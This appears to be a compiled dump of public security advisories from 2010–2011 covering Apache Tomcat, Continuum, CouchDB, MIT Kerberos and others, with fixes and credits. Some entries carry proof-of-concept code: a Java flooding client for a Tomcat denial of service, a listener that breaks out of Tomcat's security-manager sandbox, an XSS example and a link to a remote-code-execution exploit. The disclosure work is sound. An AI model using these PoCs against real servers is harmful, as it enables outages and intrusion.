Microsoft Windows Server 2008 R2 (Itanium)
Microsoft Windows Vista Service Pack 1
Microsoft Windows Vista Service Pack 2
Microsoft Windows Vista x64 Edition Service Pack 1
Microsoft Windows Vista x64 Edition Service Pack 2
Microsoft Windows XP Professional x64 Edition Service Pack 2
Microsoft Windows XP Service Pack 3
IV. Binary Analysis & Exploits/PoCs
---------------------------------------
In-depth binary analysis of the vulnerability and a code execution exploit
with ASLR and DEP bypass are available through the VUPEN Binary Analysis &
Exploits Service :
http://www.vupen.com/english/services/ba-index.php
V. VUPEN Threat Protection Program
-----------------------------------
To proactively protect critical networks and infrastructures against unpatched
vulnerabilities and reduce risks related to zero-day attacks, VUPEN shares its
vulnerability research with governments and organizations members of the VUPEN
Threat Protection Program (TPP).
VUPEN TPP customers receive fully detailed and technical reports about security
vulnerabilities discovered by VUPEN and in advance of their public disclosure.
VUPEN TPP customers have been protected against this vulnerability 8 months
before the release of the Microsoft patch.
http://www.vupen.com/english/services/tpp-index.php
VI. SOLUTION
----------------
Apply the MS11-003 security update.
VII. CREDIT
--------------
This vulnerability was discovered by Nicolas Joly of VUPEN Security
VIII. ABOUT VUPEN Security
---------------------------
VUPEN is a leading IT security research company providing vulnerability
management and security intelligence solutions which enable enterprises
and institutions to eliminate vulnerabilities before they can be exploited,
ensure security policy compliance and meaningfully measure and manage risks.
Governmental and federal agencies, and global enterprises in the financial
services, insurance, manufacturing and technology industries rely on VUPEN
to improve their security, prioritize resources, cut time and costs, and
stay ahead of the latest threats.
* VUPEN Vulnerability Notification Service (VNS) :
http://www.vupen.com/english/services/vns-index.php
* VUPEN Binary Analysis & Exploits Service (BAE) :
http://www.vupen.com/english/services/ba-index.php
* VUPEN Threat Protection Program for Govs (TPP) :
http://www.vupen.com/english/services/tpp-index.php
* VUPEN Web Application Security Scanner (WASS) :
http://www.vupen.com/english/services/wass-index.php
IX. REFERENCES
----------------------
http://www.vupen.com/english/research-vuln.php
http://www.vupen.com/english/advisories/2011/0318
http://www.microsoft.com/technet/security/bulletin/MS11-003.mspx
X. DISCLOSURE TIMELINE
-----------------------------
2010-06-15 - Vulnerability Discovered by VUPEN
2010-06-17 - VUPEN TPP customers informed
2010-xx-xx - Vulnerability rediscovered by third parties
2011-02-08 - MS11-003 security update available"
13285,[SECURITY] CVE-2010-3449: Apache Continuum CSRF vulnerability,,CVE-2010-3449,"CVE-2010-3449: Apache Continuum CSRF vulnerability
Severity: Important
Vendor:
The Apache Software Foundation
Versions Affected:
Continuum 1.3.6
Continuum 1.4.0 (Beta)
The unsupported versions Continuum 1.1 - 1.2.3.1 are also affected.
Description:
Administrators are able to change any user's password, but the
source of the request is not verified, making the behaviour
susceptible to CSRF.
Mitigation:
Continuum 1.3.6 and earlier users should upgrade to 1.3.7
Continuum 1.4.0 (Beta) users should apply the following patch:
http://svn.apache.org/viewvc?view=revision&revision=1066010
Credit:
This issue was discovered by Anatolia Security Research Group
References:
http://continuum.apache.org/security.html
--
Brett Porter
brett apache org
http://brettporter.wordpress.com/
http://au.linkedin.com/in/brettporter"
13286,[SECURITY] CVE-2011-0533: Apache Continuum cross-site scripting vulnerability,,CVE-2011-0533,"CVE-2011-0533: Apache Continuum cross-site scripting vulnerability
Severity: Important
Vendor:
The Apache Software Foundation
Versions Affected:
Continuum 1.3.6
Continuum 1.4.0 (Beta)
The unsupported versions Continuum 1.1 - 1.2.3.1 are also affected.
Description:
A request that included a specially crafted request parameter could be
used to inject arbitrary HTML or Javascript into Continuum project
pages.
Mitigation:
Continuum 1.3.6 and earlier users should upgrade to 1.3.7
Continuum 1.4.0 (Beta) users should apply the following patch:
http://svn.apache.org/viewvc?view=revision&revision=1066056
Credit:
This issue was discovered by Tal Be'ery of Imperva.
References:
http://continuum.apache.org/security.html
--
Brett Porter
brett apache org
http://brettporter.wordpress.com/
http://au.linkedin.com/in/brettporter"
13299,CGI:IRC XSS issue (CVE-2011-0050),,CVE-2011-0050,"Michael Brooks (Sitewatch) discovered an XSS issue in the nonjs
interface that allowed HTML injection via a crafted parameter.
0.5.10 is now available. This is actually just 0.5.9 with the
following fix:
- CVE-2011-0050: XSS in R param in nonjs interface
David"
13321,CVE-2010-4435 - Multiple Vendor Calendar Manager Remote Code Execution,,CVE-2010-4435,"Dear List,
So finally all the vendors fixed this critical issue (remote code
execution).
As usual, here it goes the PoC to help in the exploitation. It works
against all the affected vendors, so just adjust your payload and have fun!
http://www.kernelhacking.com/rodrigo/exploits/cmsd_cve2010-4435.c
Regards,
Rodrigo (BSDaemon)."
13322,MITKRB5-SA-2011-002 KDC denial of service attacks [CVE-2011-0281 CVE-2011-0282 CVE-2011-0283],,CVE-2011-0281,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
MITKRB5-SA-2011-002
MIT krb5 Security Advisory 2011-002
Original release: 2011-02-08
Last update: 2011-02-08
Topic: KDC denial of service attacks
CVE-2011-0281: KDC vulnerable to hang when using LDAP back end
CVSSv2 Vector: AV:N/AC:L/Au:N/C:N/I:N/A:C/E:H/RL:OF/RC:C
CVSSv2 Base Score: 7.8
Access Vector: Network
Access Complexity: Low
Authentication: None
Confidentiality Impact: None
Integrity Impact: None
Availability Impact: Complete
CVSSv2 Temporal Score: 6.8
Exploitability: High
Remediation Level: Official Fix
Report Confidence: Confirmed
CVE-2011-0282: KDC vulnerable to crash when using LDAP back end
CVSSv2 Vector: AV:N/AC:L/Au:N/C:N/I:N/A:C/E:H/RL:OF/RC:C
CVSSv2 Base Score: 7.8
CVSSv2 Temporal Score: 6.8
CVE-2011-0283: krb5-1.9 KDC vulnerable to crash
CVSSv2 Vector: AV:N/AC:L/Au:N/C:N/I:N/A:C/E:H/RL:OF/RC:C
CVSSv2 Base Score: 7.8
CVSSv2 Temporal Score: 6.8
SUMMARY
=======
The MIT krb5 Key Distribution Center (KDC) daemon is vulnerable to
denial of service attacks from unauthenticated remote attackers.
CVE-2011-0281 and CVE-2011-0282 occur only in KDCs using LDAP back
ends, but CVE-2011-0283 occurs in all krb5-1.9 KDCs.
Exploit code is not known to exist, but the vulnerabilities are easy
to trigger manually. The trigger for CVE-2011-0281 has already been
disclosed publicly, but that fact might not be obvious to casual
readers of the message in which it was disclosed. The triggers for
CVE-2011-0282 and CVE-2011-0283 have not yet been disclosed publicly,
but they are also trivial.
IMPACT
======
CVE-2011-0281: An unauthenticated remote attacker can cause a KDC
configured with an LDAP back end to become completely unresponsive
until restarted.
CVE-2011-0282: An unauthenticated remote attacker can cause a KDC
configured with an LDAP back end to crash with a null pointer
dereference.
CVE-2011-0283: An unauthenticated remote attacker can cause a krb5-1.9
KDC with any back end to crash with a null pointer dereference.
AFFECTED SOFTWARE
=================
CVE-2011-0281 and CVE-2011-0282: The KDC in releases krb5-1.6 and
later are vulnerable. Earlier releases did not contain the LDAP back
end code, and are therefore not vulnerable to these issues.
CVE-2011-0283: The KDC in krb5-1.9 is vulnerable. Earlier releases
did not contain the bug.
FIXES
=====
* Workaround: restart the KDC when it becomes unresponsive or crashes,
possibly using an automated monitoring process.
* The patch for the krb5-1.9 release is available at
http://web.mit.edu/kerberos/advisories/2011-002-patch.txt
A PGP-signed patch is available at
http://web.mit.edu/kerberos/advisories/2011-002-patch.txt.asc
* The patch for the krb5-1.8 and krb5-1.7 releases is at
http://web.mit.edu/kerberos/advisories/2011-002-patch-r18.txt
For the 1.7 releases, apply the patch ignoring whitespace
(use ""patch -l"").
A PGP-signed patch is available at
http://web.mit.edu/kerberos/advisories/2011-002-patch-r18.txt.asc
* The following patch applies to the krb5-1.6 release series.
This patch is also available at
http://web.mit.edu/kerberos/advisories/2011-002-patch-r16.txt
A PGP-signed patch is available at
http://web.mit.edu/kerberos/advisories/2011-002-patch-r16.txt.asc
REFERENCES
==========
This announcement is posted at:
http://web.mit.edu/kerberos/advisories/MITKRB5-SA-2011-002.txt
This announcement and related security advisories may be found on the
MIT Kerberos security advisory page at:
http://web.mit.edu/kerberos/advisories/index.html
The main MIT Kerberos web page is at:
http://web.mit.edu/kerberos/index.html
Mailing list message describing the trigger for CVE-2011-0281:
http://mailman.mit.edu/pipermail/kerberos/2010-December/016800.html
CVSSv2:
http://www.first.org/cvss/cvss-guide.html
http://nvd.nist.gov/cvss.cfm?calculator&adv&version=2
CVE:
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-0281
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-0282
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-0283
ACKNOWLEDGMENTS
===============
The CVE-2011-0281 issue was discovered by Kevin Longfellow of Oracle
Corporation.
The CVE-2011-0283 issue was discovered by Zbysek Mraz of Red Hat.
CONTACT
=======
The MIT Kerberos Team security contact address is
<krbcore-security mit edu>. When sending sensitive information,
please PGP-encrypt it using the following key:
pub 2048R/8B8DF501 2010-01-15 [expires: 2011-02-01]
uid MIT Kerberos Team Security Contact <krbcore-security mit edu>
pub 2048R/56CD8F76 2010-12-29 [expires: 2012-02-01]
uid MIT Kerberos Team Security Contact <krbcore-security mit edu>
DETAILS
=======
CVE-2011-0281: KDC vulnerable to hang when using LDAP back end
The LDAP KDC database back end converts an internal representation of
the protocol encoding of a Kerberos principal name into a single C
string in order to do a lookup in LDAP. The ""unparse"" code that does
this transformation can produce backslash escape sequences which the
LDAP client library rejects during the LDAP lookup. The LDAP KDC
database back end loops attempting to reconnect to the LDAP server,
but leaks file descriptors while doing so.
When the amount of leakage reaches a file descriptor limit (e.g.,
FD_SETSIZE), the KDC may become unresponsive. One possibility is that
having more than FD_SETSIZE open file descriptors causes select() to
become incapable of detecting status changes on the newest file
descriptor that the KDC uses to communicate with the LDAP server.
CVE-2011-0282: KDC vulnerable to crash when using LDAP back end
CVSSv2 Vector: AV:N/AC:L/Au:N/C:N/I:N/A:C/E:H/RL:OF/RC:C
CVSSv2 Base Score: 7.8
Access Vector: Network
Access Complexity: Low
Authentication: None
Confidentiality Impact: None
Integrity Impact: None
Availability Impact: Complete
CVSSv2 Temporal Score: 6.8
Exploitability: High
Remediation Level: Official Fix
Report Confidence: Confirmed
The KDC LDAP back end, when testing whether a principal belongs to the
default realm, assumes that principal name components are
null-terminated and are not null pointers. Both of these assumptions
are invalid in the general case, so an attacker could craft a
principal name to induce a null pointer dereference or reading beyond
the end of a buffer, causing a crash. Data leakage resulting from the
overrun is essentially impossible because the read operation is a
comparison rather than a copy.
CVE-2011-0283: krb5-1.9 KDC vulnerable to crash
CVSSv2 Vector: AV:N/AC:L/Au:N/C:N/I:N/A:C/E:H/RL:OF/RC:C
CVSSv2 Base Score: 7.8
Access Vector: Network
Access Complexity: Low
Authentication: None
Confidentiality Impact: None
Integrity Impact: None
Availability Impact: Complete
CVSSv2 Temporal Score: 6.8
Exploitability: High
Remediation Level: Official Fix
Report Confidence: Confirmed
Changes in the KDC network code in the krb5-1.9 release introduced a
bug that allows a null pointer dereference, which would cause the KDC
to crash. Any request packet that is sufficiently malformed that the
KDC would not generate a response packet can trigger this bug.
REVISION HISTORY
================
2011-02-08 original release
Copyright (C) 2011 Massachusetts Institute of Technology
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.8 (SunOS)
iEYEARECAAYFAk1RlFMACgkQSO8fWy4vZo5GBQCdHjbGW27n3nskeQCzlCkQY1aA
H40AnAsI0BTieELwAz8rcshwkocFhSTJ
=uL6I
-----END PGP SIGNATURE-----"
13323,MITKRB5-SA-2011-001 kpropd denial of service [CVE-2010-4022],,CVE-2010-4022,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
MITKRB5-SA-2011-001
MIT krb5 Security Advisory 2011-001
Original release: 2011-02-08
Last update: 2011-02-08
Topic: kpropd denial of service
CVE-2010-4022
CVSSv2 Vector: AV:N/AC:L/Au:N/C:N/I:N/A:P/E:H/RL:OF/RC:C
CVSSv2 Base Score: 5
Access Vector: Network
Access Complexity: Low
Authentication: None
Confidentiality Impact: None
Integrity Impact: None
Availability Impact: Partial
CVSSv2 Temporal Score: 4.4
Exploitability: High
Remediation Level: Official Fix
Report Confidence: Confirmed
SUMMARY
=======
The MIT krb5 KDC database propagation daemon (kpropd) is vulnerable to
a denial-of-service attack triggered by invalid network input. If a
kpropd worker process receives invalid input that causes it to exit
with an abnormal status, it can cause the termination of the listening
process that spawned it, preventing the slave KDC it was running on
from receiving database updates from the master KDC.
Exploit code is not known to exist, but the vulnerability is easy to
trigger manually.
IMPACT
======
An unauthenticated remote attacker can cause kpropd running in
standalone mode (the ""-S"" option) to terminate its listening process,
preventing database propagations to the KDC host on which it was
running. Configurations where kpropd runs in incremental propagation
mode (""iprop"") or as an inetd server are not affected.
AFFECTED SOFTWARE
=================
kpropd in releases krb5-1.7 and later are vulnerable. Earlier
releases did not contain the incremental propagation implementation
that inadvertently introduced this problem.
FIXES
=====
* Workaround: if incremental propagation is not configured, run kpropd
as an inetd service.
* Future patch releases for 1.7, 1.8, and 1.9 will contain a fix.
* Apply the patch:
diff -up krb5/src/slave/kpropd.c krb5/src/slave/kpropd.c
- --- krb5/src/slave/kpropd.c 2010-12-17 11:14:26.000000000 -0500
+++ krb5/src/slave/kpropd.c 2010-12-17 11:41:19.000000000 -0500
@@ -404,11 +404,11 @@ retry:
}
close(s);
- - if (iproprole == IPROP_SLAVE)
+ if (iproprole == IPROP_SLAVE) {
close(finet);
- -
- - if ((ret = WEXITSTATUS(status)) != 0)
- - return (ret);
+ if ((ret = WEXITSTATUS(status)) != 0)
+ return (ret);
+ }
}
if (iproprole == IPROP_SLAVE)
break;
This patch is also available at
http://web.mit.edu/kerberos/advisories/2011-001-patch.txt
A PGP-signed patch is available at
http://web.mit.edu/kerberos/advisories/2011-001-patch.txt.asc
REFERENCES
==========
This announcement is posted at:
http://web.mit.edu/kerberos/advisories/MITKRB5-SA-2011-001.txt
This announcement and related security advisories may be found on the
MIT Kerberos security advisory page at:
http://web.mit.edu/kerberos/advisories/index.html
The main MIT Kerberos web page is at:
http://web.mit.edu/kerberos/index.html
CVSSv2:
http://www.first.org/cvss/cvss-guide.html
http://nvd.nist.gov/cvss.cfm?calculator&adv&version=2
CVE:
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-4022
ACKNOWLEDGMENTS
===============
This issue was discovered by Keiichi Mori of Red Hat.
CONTACT
=======
The MIT Kerberos Team security contact address is
<krbcore-security mit edu>. When sending sensitive information,
please PGP-encrypt it using the following key:
pub 2048R/8B8DF501 2010-01-15 [expires: 2011-02-01]
uid MIT Kerberos Team Security Contact <krbcore-security mit edu>
pub 2048R/56CD8F76 2010-12-29 [expires: 2012-02-01]
uid MIT Kerberos Team Security Contact <krbcore-security mit edu>
DETAILS
=======
As a result of the changes implementing incremental propagation, the
do_standalone() function in kpropd.c gained a flaw in child process
handling. The do_iprop() function, which implements the bulk of the
incremental propagation capability, may need to receive a full
database dump from the master KDC, and calls do_standalone() with an
iprop_role argument of IPROP_SLAVE to partially emulate the behavior
of an ordinary (non-incremental) kpropd. Unlike in earlier versions
of kpropd, do_standalone() returns the child's exit status (and thus
ceases accepting connections) if the worker process child exits
abnormally, rather than ignoring it. The correct behavior when
receiving an abnormal exit status from the child process would be to
return from do_standalone() only when invoked from do_iprop().
REVISION HISTORY
================
2011-02-08 original release
Copyright (C) 2010 Massachusetts Institute of Technology
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.8 (SunOS)
iEYEARECAAYFAk1RlE4ACgkQSO8fWy4vZo6MkACghLz1l0/+aO4hs2iQwlCZBjeR
v7EAoNHYLVApbjrLTEKNsHLXXAjTIfWb
=2W7G
-----END PGP SIGNATURE-----"
13354,[SECURITY] CVE-2011-0013 Apache Tomcat Manager XSS vulnerability,,CVE-2011-0013,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
CVE-2011-0013 Apache Tomcat Manager XSS vulnerability
Severity: Low
Vendor: The Apache Software Foundation
Versions Affected:
- - Tomcat 7.0.0 to 7.0.5
- - Tomcat 6.0.0 to 6.0.29
- - Tomcat 5.5.0 to 5.5.31
- - Earlier, unsupported versions may also be affected
Description:
The HTML Manager interface displayed web applciation provided data, such
as display names, without filtering. A malicious web application could
trigger script execution by an administartive user when viewing the
manager pages.
Example:
<display-name>&lt;script&gt;alert('hi');&lt;/script&gt;</display-name>
Mitigation:
Users of affected versions should apply one of the following mitigations:
- - Upgrade to a Tomcat version where this issue is fixed
- - Undeploy untrusted web applications
- - Remove the Manager application
Credit:
The issue was identified by the Tomcat security team.
References:
http://tomcat.apache.org/security.html
http://tomcat.apache.org/security-7.html
http://tomcat.apache.org/security-6.html
http://tomcat.apache.org/security-5.html
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.9 (MingW32)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org/
iQIcBAEBAgAGBQJNTLB+AAoJEBDAHFovYFnnul0P/iupVkfHFjgIN5rkDHVoArfU
MkIcm5GMCqb1d0th8JmEtoFlI09sTJdGwyUbiC4hnuj/lA+BJuW/wDSzM2esfXGX
okraVm1SI6eI5DceQf/QzPZ9FIq3Z8mqixzBX959aQY1+JnW3Ah4vIYvZpaKpyi+
BMIj0JtIVEVNajAnUYQn9ruZg9FFX+t1Ajb6n+CJV3D4ux7XMGLFv2y5XPwVwJXm
AP/0jAHoMbjaRMwHrUxgkIDMpwpOcHFIfFq7zHjo9OTtL2LJ+vrB3FlxV6rZygMt
gwPeDeUoCCphrf1UncUzckW280/WGfsr3xncNEOpCG3o6xQkRV8eoGNikw5xZ2U8
YxLr4RdpJemUhx94jDYiMdT/gYyHbMfHtVsG3VObFp2yEjnLHU7HI6tI3C617nau
Czg1Z/YqnUvZfGDQDL5bXkF6dlWav9CmXuXht7gS3yskkYIJPJn0oZhAYweznK+v
Ua3jqNvsVktsGd76UtRh246Js6ie4EYmusZ3LqJQmsbkoPxkcAFuHCkZqVBR37SF
tt9yI7qUAb+022L+EGQkmjfcy0O9e4WKMXwf5ocywSDVAJH2/EuGTY1vAojHqGNO
hM88fdKus3Vfvj4vqzkAH+4LpdpPmK80xl+KxSJMBg+cWYLe6OGYEL7FbdoswcRv
cNZcMy4fbYmWPQkY+miZ
=sDwq
-----END PGP SIGNATURE-----"
13355,[SECURITY] CVE-2011-0534 Apache Tomcat DoS vulnerability,,CVE-2011-0534,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
CVE-2011-0534 Apache Tomcat DoS vulnerability
Severity: Important
Vendor: The Apache Software Foundation
Versions Affected:
- - Tomcat 7.0.0 to 7.0.6
- - Tomcat 6.0.0 to 6.0.30
Description:
Tomcat did not enforce the maxHttpHeaderSize limit while parsing the
request line in the NIO HTTP connector. A specially crafted request
could trigger an DoS via an OutOfMemoryError.
Example (AL2 licensed):
package bug50631;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.SocketAddress;
public class FloodClient1 {
static final int k_step = 10;
static byte[] value = new byte[k_step * 1024];
public static void main(String[] args) throws Exception {
int i = 0;
while (i < value.length) {
value[i++] = 13;
}
SocketAddress addr = new InetSocketAddress(""localhost"", 8080);
Socket socket = new Socket();
socket.setSoTimeout(0);
socket.connect(addr, 0);
OutputStream os = socket.getOutputStream();
// InputStream is = socket.getInputStream();
int k = k_step;
int m = 0;
int k100 = 100;
while (m < 2000) {
if (k >= k100) {
k100 += 100;
System.out.print('.');
System.out.flush();
}
if (k >= 1024) {
m++;
k -= 1024;
k100 = 100;
System.out.println("" "" + m + "" Mb"");
}
os.write(value);
os.flush();
Thread.sleep(1);
k+=k_step;
}
}
}
Mitigation:
Users of affected versions should apply one of the following mitigations
- - Upgrade to a Tomcat version where this issue is fixed
- - Use a BIO or AJP HTTP connector in place of an NIO HTTP connector
Credit:
The issue was identified by the Tomcat security team.
References:
https://issues.apache.org/bugzilla/show_bug.cgi?id=50631
http://tomcat.apache.org/security.html
http://tomcat.apache.org/security-7.html
http://tomcat.apache.org/security-6.html
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.9 (MingW32)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org/
iQIcBAEBAgAGBQJNTLBxAAoJEBDAHFovYFnnVFsQAIE5bU+2aJccXjnlYkEZAr4S
aXmHOCqTOzaW5ob3hPhpFmOwZx3Miabx9fJPRGnCb8CEihz00soYbMcTRHbgDqXA
d/bXMr4xjZF80AM/cWng0vmDbgnLbhVUkGwNqLtuU2rjyxfnRNKBkc0CDIoDQ1FV
zkm5uW9DYTpCmcRo13IhCPanY1DRA/+QiUxriofeUPuz6skiUuyBiY95GDQNOvSo
GofEJt39DBnPDb2kzonkQTERo2OgSIPDgLeas3/pawHGsQXaBH3dwOsRQESExJS+
kT5xuhUuqynWNGXnimG0x8yCDe7+SujiAmSjTSrblBIanOtIt3SxjSe9+SasSQih
jNO/M87aQ/znmlIlVeS4F+OFuWSuBUB+GjpZn1L77pG+/yWiHurhUuAXM2borB9c
I45c2yuYstki7ej9buHXpy5l4d6A28FT61V6E2sENM9RMMHFY7cUJmorbsBf1qj2
ei+h9QEcNiwg/on0apg9pU+B1PCZxGR7G/8aMCXFfkri4opeAXy7ZpJfk+k2zI64
S8edezROjZxgztqZKydpFn2MrQ9tUmoioZHUEiZqAuPVfszXvUdLZsSFh+7A6+4D
jL+T7jIt9wsCxsZJ1+8X03nEkD7Yop+kHvUmMjyM4XEKLReI+PoXfYBrNou7Nhvm
niulExg4qtuJplCbEw8k
=06CU
-----END PGP SIGNATURE-----"
13357,[SECURITY] CVE-2010-3718 Apache Tomcat Local bypass of security manger file permissions,,CVE-2010-3718,"CVE-2010-3718 Apache Tomcat Local bypass of security manger file permissions
Severity: Low
Vendor: The Apache Software Foundation
Versions Affected:
- Tomcat 7.0.0 to 7.0.3
- Tomcat 6.0.0 to 6.0.?
- Tomcat 5.5.0 to 5.5.?
- Earlier, unsupported versions may also be affected
Description:
When running under a SecurityManager, access to the file system is
limited but web applications are granted read/write permissions to the
work directory. This directory is used for a variety of temporary files
such as the intermediate files generated when compiling JSPs to Servlets.
The location of the work directory is specified by a ServletContect
attribute that is meant to be read-only to web applications. However,
due to a coding error, the read-only setting was not applied. Therefore
a malicious web application may modify the attribute before Tomcat
applies the file permissions. This can be used to grant read/write
permissions to any area on the file system which a malicious web
application may then take advantage of.
This vulnerability is only applicable when hosting web applications from
untrusted sources such as shared hosting environments.
Example (AL2 licensed):
Listener source
---------------
package listeners;
import javax.servlet.ServletContext;
import javax.servlet.ServletContextEvent;
import javax.servlet.ServletContextListener;
public final class FooListener implements ServletContextListener {
public void contextInitialized(ServletContextEvent event) {
ServletContext context = event.getServletContext();
java.io.File workdir = (java.io.File) context
.getAttribute(""javax.servlet.context.tempdir"");
if (workdir.toString().indexOf("".."") < 0) {
context.setAttribute(""javax.servlet.context.tempdir"",
new java.io.File(workdir, ""../../../../conf""));
}
}
public void contextDestroyed(ServletContextEvent event) {
}
}
web.xml snippet
---------------
<listener>
<listener-class>listeners.FooListener</listener-class>
</listener>
Mitigation:
Users of affected versions should apply one of the following mitigations:
- Upgrade to a Tomcat version where this issue is fixed
- Undeploy all web applications from untrusted sources
Credit:
The issue was identified by the Tomcat security team.
References:
http://tomcat.apache.org/security.html
http://tomcat.apache.org/security-7.html
http://tomcat.apache.org/security-6.html
http://tomcat.apache.org/security-5.html"
13400,CVE-2010-3854: Apache CouchDB Cross Site Scripting Issue,,CVE-2010-3854,"CVE-2010-3854: Apache CouchDB Cross Site Scripting Issue
Severity: Important
Vendor:
The Apache Software Foundation
Versions Affected:
Apache CouchDB 0.8.0 to 1.0.1
Description:
Apache CouchDB versions prior to version 1.0.2 are vulnerable to
cross site scripting (XSS) attacks.
Mitigation:
All users should upgrade to CouchDB 1.0.2. Upgrades from the 0.11.x
and 0.10.x series should be seamless. Users on earlier versions
should consult http://wiki.apache.org/couchdb/Breaking_changes
Example:
Due to inadequate validation of request parameters and cookie data in
Futon, CouchDB's web-based administration UI, a malicious site can
execute arbitrary code in the context of a user's browsing session.
Credit:
This XSS issue was discovered by a source that wishes to stay
anonymous.
References:
http://couchdb.apache.org/downloads.html
http://wiki.apache.org/couchdb/Breaking_changes
http://en.wikipedia.org/wiki/Cross-site_scripting
Jan Lehnardt
--"
13453,[TEHTRI-Security] CVE-2010-2599: Update your BlackBerry,,CVE-2010-2599,"Gents,
BlackHat Washington DC has just finished, and we wanted to let you know
that RIM officially released a patch for the vulnerability found by
TEHTRI-Security in BlackBerry devices, and covered during our talk:
""Inglourious Hackerds: Targeting Web Clients"".
The 0day created by TEHTRI-Security affects the BlackBerry browser
application of the following software versions:
* BlackBerry Device Software versions earlier than 6.0.0
This vulnerability has a Common Vulnerability Scoring System (CVSS)
score of 5.0 (Partial DoS in the BlackBerry browser application), but
could be used for sharp & evil purpose by those who know how to play
with such kind of stuff.
Basically, thanks to our 0day, an attacker could maliciously craft a web
page such that, when the BlackBerry device user views the page on a
device running the affected BlackBerry Device Software, the browser
application becomes unresponsive.
To quote RIM web site, the BlackBerry device subsequently terminates the
browser, and the browser eventually restarts and displays an error message.
Successful exploitation of this issue relies on the user viewing the
maliciously crafted web page on a device running the affected BlackBerry
Device Software. The impact is limited to a partial Denial of Service
(DoS) in the browser application in use on the BlackBerry device.
What was quite funny is that, with little tweaks (based on incoming
User-Agent + sizes of buffers + payloads...) our 0day also worked
against HTC Windows, Apple iPhone/iPod (CVE-2010-1752) and Google
Android devices, with different kind of results. It's all related to a
flaw in the way those devices try to handle HTML codes, based on some
concepts taken from the HTTP RFC directly...
To avoid the spread of annoying exploits, that would target customers of
Google, RIM, Apple & HTC, we only shared some information with the
vendors and during the BlackHat DC event, but our slides on BlackHat.com
will also contain part of information.
If you want to go further, here are some useful links:
- Official RIM web page dealing with our 0Day:
http://www.blackberry.com/btsc/KB24841
- BlackHat Washington DC:
https://www.blackhat.com/html/bh-dc-11/bh-dc-11-schedule.html
- Mitre CVE Entry
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-2599
- Gartner.com Blog Entry about our talk @BHDC:
http://blogs.gartner.com/john_pescatore/2011/01/20/if-a-toy-breaks-in-a-work-forest-will-the-toy-vendor-hear-a-noise-and-fix-it/
- NetworkWorld Press Article about our talk @BHDC:
http://www.networkworld.com/news/2011/012011-retaliation-answer-cyber-attacks.html
- TEHTRI-Security Blog:
http://blog.tehtri-security.com/2011/01/blackhat-dc-2011-inglourious-hackerds.html
We would like to thanks the security experts of RIM who came to our talk
in Washington, and who took time there to share explanations with our
attendees in order to show how they mitigated our findings by handling
those issues with all the carriers involved worldwide (what an
incredible task).
On our side, we got technical fun by doing technical penetration tests
on those devices, and this is how we found such 0days. We do think that
basic tests are not always done properly because of consumerization,
money & time issues, etc.
Recently, we found 0days against IP Camera surveillance, etc, by doing
penetration tests. We live in world where everything has to be clean,
beautiful, quick, easy, marketable, and certified. But what about IT
Security, while everything gets more and more complex...
We now all get Certified non-Ethically Hackable...
""Good night, and Good luck.""
Best regards,
Laurent OUDOT, from Washington DC, USA @BlackHatDC Briefings
( http://blackhat.com/html/bh-dc-11/bh-dc-11-briefings.html#Oudot )
TEHTRI-Security - ""This is not a Game.""
http://www.tehtri-security.com/
http://twitter/tehtris"
13484,'Seo Panel' Cookie-Rendered Persistent XSS Vulnerability (CVE-2010-4331),,CVE-2010-4331,"'Seo Panel' Cookie-Rendered Persistent XSS Vulnerability (CVE-2010-4331)
Mark Stanislav - mark.stanislav gmail com
I. DESCRIPTION
---------------------------------------
A vulnerability exists in 'Seo Panel' page rendering which allows for unfiltered, unencrypted content to be presented to a user through two different cookies.
II. TESTED VERSION
---------------------------------------
2.2.0
III. PoC EXPLOIT
---------------------------------------
Alter the value of cookies called 'default_news' or 'sponsors' and then view a site page which includes controllers/index.ctrl.php or controllers/settings.ctrl.php that will render the cookies as they exist on the user's machine.
IV. NOTES
---------------------------------------
* The 'default_news' cookie doesn't require a user to be authenticated whereas 'sponsors' does
* The disclosure date was pushed a full month so that a fix could be released but no update was released yet
* Based on discussions with the developer, they will likely encrypt the cookie contents to prevent this issue
V. SOLUTION
---------------------------------------
Upgrade to a release > 2.2.0 when available or otherwise disable cookie rendering.
VI. REFERENCES
---------------------------------------
http://www.seopanel.in/
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-4331
http://www.uncompiled.com/2011/01/seo-panel-cookie-rendered-persistent-xss-vulnerability-cve-2010-4331/
VII. TIMELINE
---------------------------------------
11/24/2010 - Initial vendor disclosure
11/25/2010 - Vendor response and commitment to fix
11/25/2010 - Reply to vendor detailing potential fixes and an adjusted public disclosure date
11/25/2010 - Vendor response confirming desired public disclosure date and agreement to patch method
01/15/2011 - Public disclosure"
13651,Embedded Video WordPress Plugin Cross Site Vulnerability (XSS) - CVE-2010-4277,,CVE-2010-4277,"Dear List,
I'm writing on behalf of the Check Point Vulnerability Discovery Team to publish the following vulnerability.
Check Point Software Technologies - Vulnerability Discovery Team (VDT)
http://www.checkpoint.com/defense/
Embedded Video WordPress Plugin Cross Site Scripting Vulnerability
CVE-2010-4277
INTRODUCTION
Embedded Video is a WordPress Plugin created by Jovel Stefan to easily embedded videos in blog posts. The videos can be uploaded to the web server
or come from external portals (like YouTube, Google Video and others). Links to the video on the video portal or for download of the video can be
automatically generated as well. The linktext is also configurable individually. Furthermore a fixed prefix for the linktext can be determined. The
videos can be integrated easily by using the built-in WYSIWYG editor. The plugin has a Cross Site Script (XSS) vulnerability.
This problem was confirmed in the latest version of the plugin, other versions maybe also affected.
The developer of the replied to the advisory in a very responsible and fast manner, but unfortunately, there will be no updates due to the fact that
this plugin is not maintained anymore.
CVSS Scoring System
The CVSS score is: 6.4
Base Score: 6.7
Temporal Score: 6.4
We used the following values to calculate the scores:
